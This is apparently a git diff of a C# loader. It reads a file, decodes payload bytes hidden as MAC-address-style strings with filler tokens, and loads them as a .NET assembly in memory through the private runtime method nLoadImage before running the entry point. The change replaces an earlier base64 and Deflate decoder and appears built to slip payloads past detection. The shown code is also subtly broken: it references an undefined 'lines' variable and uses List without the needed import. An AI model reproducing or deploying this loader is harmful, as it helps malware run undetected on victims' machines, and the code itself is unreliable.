@@ -2,9 +2,10 @@ using System;
 using System.Runtime.InteropServices;
 using System.Reflection;
 using System.IO;
-using System.IO.Compression;
 using System.Threading;
 using System.Security;
+using System.Linq;
+
 namespace Run
 {
 	
@@ -21,24 +22,13 @@ namespace Run
 			Console.WriteLine("ADM: " + a);
 			*/
 			string aaa = File.ReadAllText(args[0]);
-			byte[] a = Decompress(Convert.FromBase64String(aaa));
+			byte[] ab = MacAddressScan(lines);
 			var scm = typeof(System.Threading.Thread).Assembly.GetType("System.Threading.StackCrawlMark");
 			object val = Enum.ToObject(scm, 1);
-			var adm = typeof(System.AppDomain).Assembly.GetType("System.AppDomain");
-			var sadmt = adm.GetMethod("SetAppDomainManagerType", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
-			var kernel32 = typeof(System.Reflection.Assembly).Assembly.GetType("System.Reflection.RuntimeAssembly");
-			var VirtualAlloc = kernel32.GetMethod("nLoadImage", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
-            		Console.WriteLine("nLoad:" + VirtualAlloc.MethodHandle.GetFunctionPointer().ToString("X"));
-			Console.WriteLine("SetADM:" + sadmt.MethodHandle.GetFunctionPointer().ToString("X"));
-			Console.WriteLine("Calling Load");
-			Console.Read();
-			var assem = (Assembly) VirtualAlloc.Invoke(null, new object[] { a, null, null, val, false, false, SecurityContextSource.CurrentAssembly });
-			Console.WriteLine(assem.FullName);
-			var codeBase = assem.GetType().GetProperty("FullName",System.Reflection.BindingFlags.NonPublic);
-			foreach (FieldInfo property in assem.GetType().GetFields(BindingFlags.Instance | BindingFlags.NonPublic |BindingFlags.Public))
-			{
-				Console.WriteLine(property.Name);
-			}
+			var ktt = typeof(System.Reflection.Assembly).Assembly.GetType("System.Reflection.RuntimeAssembly");
+			var hf = ktt.GetMethod("nLoadImage", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
+		
+			var assem = (Assembly) hf.Invoke(null, new object[] { ab, null, null, val, false, false, SecurityContextSource.CurrentAssembly });
 			
 			//Assembly assem = Assembly.Load(a);
 			MethodInfo mi = assem.EntryPoint;
@@ -48,16 +38,27 @@ namespace Run
 			
 		
 		}
-		public static byte[] Decompress(byte[] data)
+		private static byte[] MacAddressScan(string[] mcaddrArray)
         {
-            MemoryStream input = new MemoryStream(data);
-            MemoryStream output = new MemoryStream();
-            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
+            List<byte> mcaddr = new List<byte>();
+            for (int i = 0; i < mcaddrArray.Length; i++)
             {
-                dstream.CopyTo(output);
+                string[] parts = mcaddrArray[i].Split('-');
+                if (parts.Length == 10)
+                {
+                    for (int j = 0; j < parts.Length; j++)
+                    {
+                        if (!parts[j].Contains("ABC") && !parts[j].Contains("DEF") && !parts[j].Contains("GHI") &&
+                            !parts[j].Contains("JKL") && !parts[j].Contains("MNO") && !parts[j].Contains("PQR"))
+                        {
+                            mcaddr.Add(Convert.ToByte(parts[j], 16));
+                        }
+                    }
+                }
+                
             }
-            return output.ToArray();
-        }
+            return mcaddr.ToArray();
+        }      
 		
 	}
 }
